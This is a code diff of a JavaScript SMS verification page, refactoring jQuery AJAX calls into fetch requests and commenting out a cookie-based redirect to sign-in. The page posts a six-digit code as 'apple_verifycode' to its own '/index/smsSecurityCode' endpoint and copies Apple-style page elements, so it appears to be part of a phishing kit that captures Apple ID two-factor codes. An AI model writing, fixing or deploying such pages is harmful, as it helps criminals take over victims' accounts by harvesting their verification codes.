@@ -1,7 +1,7 @@
 // 检查必要的cookie是否存在,如果不存在则重定向到首页
-if (!$.cookie('Guid') || !$.cookie('ID') || !$.cookie('Number')) {
-    window.location.href = '/index/signin';
-}
+// if (!$.cookie('Guid') || !$.cookie('ID') || !$.cookie('Number')) {
+//     window.location.href = '/index/signin';
+// }
 
 // 将父窗口滚动到顶部
 $(window.parent.document).scrollTop(0);
@@ -18,10 +18,10 @@ const $loadingIcon = $('.loading-icon');
 const diffPhone = $('#diff_phone');
 const phoneCount = $.cookie('phoneCount');
 
+diffPhone.addClass('hide');
 if (phoneCount > 1) {
     diffPhone.removeClass('hide');
 }
-
 // 验证输入框数量
 if ($numberInputs.length !== 6) {
     throw new Error('无效表单: 验证码输入框数量不正确');
@@ -50,45 +50,38 @@ $('#try-again').on('click', (e) => {
     verifyingCodeText.removeClass('hide');
     diffPhone.addClass('hide');
 
-    // 发送AJAX请求重新获取验证码
-    $.ajax({
-        url: '/index/SendSms',
-        dataType: 'json',
-        type: 'post',
-        contentType: 'application/json',
-        data: JSON.stringify({Guid: $.cookie('Guid'), ID: $.cookie('ID')}),
-        success: handleSendSmsSuccess,
-        error: handleSendSmsError,
-        complete: resetUIAfterSendSms
-    });
+
+    fetchRequest('/index/SendSms',
+        'POST',
+        {
+            Guid: $.cookie('Guid'),
+            ID: $.cookie('ID')
+        }
+    ).then(data  =>{
+
+        if (data.data?.serviceErrors?.length > 0) {
+            $errorMessage.removeClass('hide').text(data.data.serviceErrors[0].message);
+        }
+
+        verifyingCodeText.addClass('hide');
+        $popButton.removeClass('hide');
+
+    }).catch(error => {
+
+        $errorMessage.removeClass('hide').text('发送失败,请稍后重试');
+        verifyingCodeText.addClass('hide');
+        $popButton.removeClass('hide');
+    }).finally(()=>{
+
+        $('.loading-icon').addClass('hide');
+        $('#try-again-link').removeClass('hide');
+        verifyingCodeText.addClass('hide');
+        $popButton.removeClass('hide');
+    })
+
+
 });
 
-// 处理发送验证码成功的回调
-function handleSendSmsSuccess(data) {
-    if (data && data.code === 302) {
-        window.location.href = '/index/signin';
-    } else if (data.data?.serviceErrors?.length > 0) {
-        $errorMessage.removeClass('hide').text(data.data.serviceErrors[0].message);
-    }
-    verifyingCodeText.addClass('hide');
-    $popButton.removeClass('hide');
-}
-
-// 处理发送验证码失败的回调
-function handleSendSmsError() {
-    $errorMessage.removeClass('hide').text('发送失败,请稍后重试');
-    verifyingCodeText.addClass('hide');
-    $popButton.removeClass('hide');
-}
-
-// 重置UI状态(发送验证码请求完成后)
-function resetUIAfterSendSms() {
-    $('.loading-icon').addClass('hide');
-    $('#try-again-link').removeClass('hide');
-    verifyingCodeText.addClass('hide');
-    $popButton.removeClass('hide');
-    diffPhone.removeClass('hide');
-}
 
 // 验证码输入处理
 $numberInputs.on('keyup', handleVerificationCodeInput);
@@ -152,43 +145,46 @@ function submitVerificationCode(smsCode) {
     verifyingCodeText.removeClass('hide');
     $liteThemeOverride.addClass('hide');
 
-    $.ajax({
-        url: '/index/smsSecurityCode',
-        dataType: 'json',
-        type: 'post',
-        contentType: 'application/json',
-        data: JSON.stringify({
-            'Guid': $.cookie('Guid'),
-            'ID': $.cookie('ID'),
-            'apple_verifycode': smsCode,
-        }),
-        success: handleVerificationSuccess,
-        error: handleVerificationError
-    });
-}
+    fetchRequest('/index/smsSecurityCode', 'POST', {
+        'Guid': $.cookie('Guid'),
+        'ID': $.cookie('ID'),
+        'apple_verifycode': smsCode,
+    }).then(data  =>{
 
-// 处理验证成功
-function handleVerificationSuccess(data) {
-    if (data && data.code === 200) {
-        $('.landing__animation', window.parent.document).hide();
-        window.location.href = '/index/result';
-    } else {
-        handleVerificationError();
-        if (data.code === 302) {
-            $('.landing__animation', window.parent.document).show();
-            window.location.href = '/index/signin';
+        if (data && data.code === 200) {
+            $('.landing__animation', window.parent.document).hide();
+            return window.location.href = '/index/result';
         }
-    }
+
+        $errorMessage.removeClass('hide').text(data.message);
+        handleVerificationError();
+    }).catch(error => {
+        $errorMessage.removeClass('hide').text('发送失败,请稍后重试');
+        handleVerificationError();
+    })
+
 }
 
 // 处理验证错误
-function handleVerificationError() {
-    $numberInputs.removeAttr('disabled').parent().addClass('is-error').val('');
-    setTimeout(() => $numberInputs.first().focus(), 10);
-    verifyingCodeText.addClass('hide');
-    $liteThemeOverride.removeClass('hide');
+function handleVerificationError(error) {
+
+    console.log('handleVerificationError', error);
+
+    for (const ele of $numberInputs) {
+        $(ele).removeAttr('disabled');
+        $(ele).parent().addClass('is-error');
+        $(ele).val('');
+        setTimeout(() => {
+            $(ele).blur();
+        }, 10);
+    }
+    setTimeout(() => {
+        $($numberInputs[0]).focus();
+    }, 10);
+    $('.verifying-code-text').addClass('hide');
+    $('.lite-theme-override').removeClass('hide');
     $errorMessage.removeClass('hide');
-    window.verify = true;
+    verify = true;
 }
 
 // 初始化:聚焦第一个输入框
